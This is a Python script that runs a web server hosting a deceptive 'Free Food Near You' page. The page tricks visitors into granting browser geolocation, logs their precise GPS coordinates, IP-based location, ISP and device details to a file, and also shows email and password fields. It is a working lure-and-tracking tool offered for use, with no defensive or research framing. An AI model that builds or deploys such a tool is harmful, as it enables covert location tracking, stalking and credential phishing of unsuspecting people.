from http.server import BaseHTTPRequestHandler, HTTPServer
import logging
import requests
import urllib.parse as urlparse
from user_agents import parse

# HTML for the fake "Free Food Finder" site
html = """
<html>
<head>
    <title>Free Food Near You</title>
    <style>
        body { font-family: Arial; background: #fff8f0; margin: 0; padding: 0; }
        header { background: #ff7043; color: white; padding: 20px; font-size: 24px; text-align: center; }
        .container { text-align: center; padding: 30px; }
        .container h2 { color: #ff7043; }
        .info { color: #333; font-size: 16px; margin-bottom: 20px; }
        input { width: 80%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 4px; }
        button { padding: 10px 20px; background: #ff7043; color: #fff; border: none; border-radius: 4px; cursor: pointer; }
        button:hover { background: #e64a19; }
        .footer { margin-top: 30px; font-size: 12px; color: gray; text-align: center; }
        #overlay { position: fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.7); display:flex; align-items:center; justify-content:center; z-index:999; }
        #popup { background:#fff; padding:20px; border-radius:8px; width:80%; max-width:300px; text-align:center; }
        #popup button { background:#28a745; color:white; padding:10px; border:none; border-radius:4px; cursor:pointer; margin-top:15px; }
    </style>
</head>
<body>
    <header>Free Food Near You!</header>

    <div id="overlay">
        <div id="popup">
            <h3>Find Free Food Nearby</h3>
            <p>Restaurants & fast food chains near you are giving away surplus food they didnt sell today. Allow location to see offers near you.</p>
            <button onclick="getLocation()">Allow Access</button>
        </div>
    </div>

    <div class="container">
        <h2>Sign in to Claim Free Food</h2>
        <p class="info">Enter your email to see available offers.</p>
        <input type="text" placeholder="Email">
        <input type="password" placeholder="Password">
        <button>See Offers</button>
        <p id="status" style="margin-top:15px; color:gray;">Waiting for location verification...</p>
    </div>
    <p class="footer">Created by <b>kchiong</b></p>

    <script>
        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(success, error, {enableHighAccuracy:true});
            } else {
                document.getElementById("status").innerText = "Geolocation not supported.";
                document.getElementById("overlay").style.display = "none";
            }
        }

        function success(position) {
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;
            const accuracy = position.coords.accuracy;

            // Send coordinates to server
            fetch('/log?lat=' + lat + '&lon=' + lon + '&accuracy=' + accuracy);
            document.getElementById("status").innerText = "Verified! Loading offers...";
            document.getElementById("overlay").style.display = "none";
        }

        function error() {
            document.getElementById("status").innerText = "Location access denied. Showing default offers.";
            document.getElementById("overlay").style.display = "none";
        }
    </script>
</body>
</html>
"""

class IPLoggerHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        user_agent_str = self.headers.get('User-Agent', 'Unknown')
        ua = parse(user_agent_str)
        device_info = f"{ua.device.family} / {ua.os.family} {ua.os.version_string} / {ua.browser.family} {ua.browser.version_string}"

        # --- Handle GPS logging ---
        if self.path.startswith("/log?"):
            query = urlparse.urlparse(self.path).query
            params = urlparse.parse_qs(query)
            lat = params.get("lat", ["Unknown"])[0]
            lon = params.get("lon", ["Unknown"])[0]
            acc = params.get("accuracy", ["Unknown"])[0]
            log_entry = f"GPS Coordinates: {lat},{lon} | Accuracy: {acc}m | Device: {device_info}"
            logging.info(log_entry)
            with open("ips.txt", "a") as f:
                f.write(log_entry + "\n")
            self.send_response(200)
            self.end_headers()
            return

        # --- IP fallback logging ---
        forwarded_for = self.headers.get('X-Forwarded-For')
        client_ip = forwarded_for.split(',')[0] if forwarded_for else self.client_address[0]

        try:
            response = requests.get(f"https://ipinfo.io/{client_ip}/json")
            data = response.json()
            city = data.get("city", "Unknown")
            region = data.get("region", "Unknown")
            country = data.get("country", "Unknown")
            org = data.get("org", "Unknown ISP")
            loc = data.get("loc", "Unknown")
        except Exception:
            city = region = country = org = loc = "Unavailable"

        log_entry = f"IP: {client_ip} | {city}, {region}, {country} | ISP: {org} | Device: {device_info} | Approx. Coordinates: {loc}"
        logging.info(log_entry)
        with open("ips.txt", "a") as f:
            f.write(log_entry + "\n")

        # Serve fake blog page
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(html.encode('utf-8'))

if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)
    server_address = ('', 8080)
    httpd = HTTPServer(server_address, IPLoggerHandler)
    print("Server running on port 8080...")
    httpd.serve_forever()
